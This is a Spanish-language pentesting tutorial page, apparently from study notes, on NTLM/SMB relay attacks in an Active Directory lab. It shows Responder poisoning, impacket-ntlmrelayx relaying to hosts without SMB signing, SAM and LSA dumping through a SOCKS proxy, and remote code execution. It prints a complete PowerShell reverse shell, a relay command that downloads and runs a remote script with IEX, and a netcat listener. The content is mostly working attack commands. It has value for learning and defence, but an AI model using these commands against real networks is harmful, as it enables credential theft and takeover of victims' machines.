<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>NTLM/SMB Relay</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>NTLM/SMB Relay</h1><br/><p><h1>¿PODRÍAMOS COGER EL HASH DEL PROCESO ANTERIOR Y REALIZAR UN PASSTHEHASH?</h1></p><p></p><p></p><p>Como hemos visto si capturamos una autenticación mediante NTLM podemos obtener los <em>challenge</em> en plano y hasheado para poder crackearlos.</p><p>No necesitamos estar capturando la red ni nada por el estilo gracias a envenenar esos protocolos.</p><p></p><p>Por supuesto el crackear contraseñas conlleva que si es muy compleja o no se encuentra en ningún diccionario puede llegar a ser imposible o tardar demasiado en ser crackeada.</p><p></p><p>Este hash no es posible utilizarlo para el <a href="Aplicación_de_técnicas_fuera_de_ActiveDirectoy--PassTheHash_37.html">PassTheHash</a> ya que no se trata de la contraseña del usuario hasheada sino un numero aleatorio que se genera cada vez que se realiza la petición de autenticación.</p><p></p><p></p><p>Utilizaremos una técnica que se llama NTLM Relay.</p><p></p><p>Consiste en utilizar otra herramienta junto con la anterior de responder que levanta un servidor SMB falso que coge la petición que lanza el cliente y la reenvía la máquina que nos interese acceder.</p><p></p><p>Por ejemplo, el administrador manda una petición NTLM, lo respondemos con nuestro SMB falso y lo redirijo a otra máquina donde nos interese, es decir que nos ponemos en medio de la comunicación para quedarnos con la comunicación al servicio ya que aunque no tengamos la autenticación ni el hash no importa porque ha sido el cliente real el que la ha cifrado por nosotros.</p><p></p><p></p><p></p><p></p><p></p><p>Los servicios a los que queramos acceder con esta técnica deben cumplir una característica que es el firmado SMB, ya que autentica el origen.</p><p>Para saber que máquinas lo tienen activo y cuales no:</p><p></p><p>Hacemos desde crackmapexec un descubrimiento de todos los hosts:</p><p></p><p><div class="codebox"><pre><br />crackmapexec smb 192.168.20.0<span style="color:#000000;font-weight:700">/</span>24 </pre></div></p><p></p><p><img src="images/44-1.png" alt="images/44-1.png" /></p><p></p><p>Como vemos la máquina DC01 si lo tiene activo y el WS01 no.</p><p></p><p></p><p>Creamos un archivo de targets con las IP que nos interesen</p><p>Con impacket levantamos el servidor SMB falso:</p><p></p><p><div class="codebox"><pre><br />impacket-ntlmrelayx -smb2support -tf targets.txt</pre></div></p><p></p><p><img src="images/44-2.png" alt="images/44-2.png" /></p><p></p><p>Envenenamos el tráfico con responder.</p><p>Editamos un momento la configuración para desactivar el SMB y HTTP que levanta responder:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sudo</span> emacs <span style="color:#000000;font-weight:700">/</span>etc<span style="color:#000000;font-weight:700">/</span>responder<span style="color:#000000;font-weight:700">/</span>Responder.conf</pre></div></p><p></p><p><img src="images/44-3.png" alt="images/44-3.png" /></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sudo</span> responder -I eth0 -bP</pre></div></p><p></p><p><img src="images/44-4.png" alt="images/44-4.png" /></p><p></p><p></p><p>Ahora lo que está ocurriendo es que responder envenena el tráfico como antes y si alguien se equivoca lo redirije a nuestro servidor SMB falso que de nuevo hace de cliente y reenvia la petición al serivicio real en la máquina objetivo de nuestro archivo targets.</p><p></p><p>De nuevo es de recalcar que esto se realiza para cualquier usuario que falle dentro del dominio, como por ejemplo un administrador:</p><p></p><p><img src="images/44-5.png" alt="images/44-5.png" /></p><p></p><p>Fallamos en la resolución de nombre pero eso es lo que vería el administrador.</p><p></p><p><img src="images/44-6.png" alt="images/44-6.png" /></p><p></p><p>Porque lo que nosotros vemos es que nos ha volcado por completo la base de datos SAM del equipo objetivo WS01 y por supuesto con esto tenemos el hash NTLM del usuario administrador local del sistema WS01.</p><p></p><p>Por supuesto el volcado de SAM es la configuración por defecto de crackmapexec pero claramente podemos ejecutar cualquier comando con los privilegios de usuario que interceptemos.</p><p></p><p>Por ejemplo en el comando: </p><p></p><p><div class="codebox"><pre><br />impacket-ntlmrelayx -smb2support -tf targets.txt -socks</pre></div></p><p></p><p>Podemos ejecutar todo a través de un proxy socks, por lo que cuando se produzca de nuevo un error por parte de un usuario como antes:</p><p></p><p><img src="images/44-7.png" alt="images/44-7.png" /></p><p></p><p>De nuevo engaña al cliente original pero además nos crea una conexión proxy socks que podemos usar en nombre del usuario que hayamos interceptado en las máquinas objetivo que tengamos en targets.</p><p></p><p>Pulsamos enter:</p><p></p><p><img src="images/44-8.png" alt="images/44-8.png" /></p><p></p><p></p><p></p><p>Ahora con proxychains:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sudo</span> emacs <span style="color:#000000;font-weight:700">/</span>etc<span style="color:#000000;font-weight:700">/</span>proxychains4.conf<br /></pre></div></p><p></p><p><img src="images/44-9.png" alt="images/44-9.png" /></p><p></p><p>Modificamos el puerto por donde escucha el NTLMRelay.</p><p></p><p><div class="codebox"><pre><br />proxychains4 crackmapexec smb 192.168.20.131 -u <span style="color:#edd400;font-weight:400">&#39;Administrador&#39;</span> -d <span style="color:#edd400;font-weight:400">&#39;corp&#39;</span> -p <span style="color:#edd400;font-weight:400">&#39;indiferente&#39;</span> --lsa --sam </pre></div></p><p></p><p>Como vemos igualmente hay que pasar una contraseña pero es indiferente ya que tenemos una sesión activa que no necesita autenticación.</p><p></p><p>Indicamos con qué herramienta queremos usar el proxy y de que usuario es la sesión y todos los parámetros que queramos:</p><p></p><p><img src="images/44-10.png" alt="images/44-10.png" /></p><p></p><p></p><p>También podemos ejecutar una reverse shell de esta forma:</p><p></p><p><a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3</a></p><p></p><p><div class="codebox"><pre><br /><span style="color:#8ae234;font-weight:700">$client</span> = New-Object System.Net.Sockets.TCPClient<span style="color:#000000;font-weight:700">(</span><span style="color:#edd400;font-weight:400">&#39;10.10.10.10&#39;</span>,80<span style="color:#000000;font-weight:700">);</span><span style="color:#8ae234;font-weight:700">$stream</span> = <span style="color:#8ae234;font-weight:700">$client</span>.<span style="color:#729fcf;font-weight:400">GetStream()</span><span style="color:#000000;font-weight:700">;</span>[byte[]]<span style="color:#8ae234;font-weight:700">$bytes</span> = 0..65535<span style="color:#000000;font-weight:700">|</span>%<span style="color:#000000;font-weight:700">{</span>0<span style="color:#000000;font-weight:700">};while((</span><span style="color:#8ae234;font-weight:700">$i</span> = <span style="color:#8ae234;font-weight:700">$stream</span>.Read<span style="color:#000000;font-weight:700">(</span><span style="color:#8ae234;font-weight:700">$bytes</span>, 0, <span style="color:#8ae234;font-weight:700">$bytes</span>.Length<span style="color:#000000;font-weight:700">))</span> -ne 0<span style="color:#000000;font-weight:700">){;</span><span style="color:#8ae234;font-weight:700">$data</span> = <span style="color:#000000;font-weight:700">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span style="color:#000000;font-weight:700">)</span>.GetString<span style="color:#000000;font-weight:700">(</span><span style="color:#8ae234;font-weight:700">$bytes</span>,0, <span style="color:#8ae234;font-weight:700">$i</span><span style="color:#000000;font-weight:700">);</span><span style="color:#8ae234;font-weight:700">$sendback</span> = <span style="color:#000000;font-weight:700">(</span>iex <span style="color:#edd400;font-weight:400">&quot;. { $data } 2&gt;&amp;1&quot;</span> <span style="color:#000000;font-weight:700">|</span> Out-String <span style="color:#000000;font-weight:700">);</span> <span style="color:#8ae234;font-weight:700">$sendback2</span> = <span style="color:#8ae234;font-weight:700">$sendback</span> + <span style="color:#edd400;font-weight:400">&#39;PS &#39;</span> + <span style="color:#000000;font-weight:700">(pwd)</span>.Path + <span style="color:#edd400;font-weight:400">&#39;&gt; &#39;</span><span style="color:#000000;font-weight:700">;</span><span style="color:#8ae234;font-weight:700">$sendbyte</span> = <span style="color:#000000;font-weight:700">(</span>[text.encoding]<span style="color:#000000;font-weight:700">::</span>ASCII<span style="color:#000000;font-weight:700">)</span>.GetBytes<span style="color:#000000;font-weight:700">(</span><span style="color:#8ae234;font-weight:700">$sendback2</span><span style="color:#000000;font-weight:700">);</span><span style="color:#8ae234;font-weight:700">$stream</span>.Write<span style="color:#000000;font-weight:700">(</span><span style="color:#8ae234;font-weight:700">$sendbyte</span>,0,<span style="color:#8ae234;font-weight:700">$sendbyte</span>.Length<span style="color:#000000;font-weight:700">);</span><span style="color:#8ae234;font-weight:700">$stream</span>.<span style="color:#729fcf;font-weight:400">Flush()</span><span style="color:#000000;font-weight:700">};</span><span style="color:#8ae234;font-weight:700">$client</span>.<span style="color:#729fcf;font-weight:400">Close()</span></pre></div></p><p></p><p>Guardamos el shell en kali.</p><p>Cambiamos la ip de conexión:</p><p><img src="images/44-11.png" alt="images/44-11.png" /></p><p></p><p>Creamos servidor:</p><p></p><p><div class="codebox"><pre><br />python2 -m SimpleHTTPServer</pre></div></p><p></p><p><div class="codebox"><pre><br />impacket-ntlmrelayx -smb2support -tf targets.txt -c <span style="color:#edd400;font-weight:400">&quot;powershell -c \&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.20.129:8000/reversePowerShell.ps1&#39;)\&quot;&quot;</span></pre></div></p><p></p><p><div class="codebox"><pre><br />netcat -lvp 5555</pre></div></p><p></p><p>Escuchamos con netcat y ahora si cuando falle algún usuario:</p><p></p><p><img src="images/44-12.png" alt="images/44-12.png" /></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
